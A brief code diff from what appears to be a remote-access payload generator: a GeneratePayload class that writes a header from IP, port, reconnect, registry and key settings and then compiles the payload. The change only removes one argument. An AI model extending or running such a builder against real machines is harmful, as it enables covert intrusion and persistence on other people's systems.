@@ -110,7 +110,7 @@ class GeneratePayload:
         other.printColor("successfully","\n[+] the current OS of the system: {}".format(self.os))
 
         #print(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
-        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.registry, self.key))
+        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.registry, self.key))
         
         self.compilate() #compilate
         time.sleep(1) #tempo 
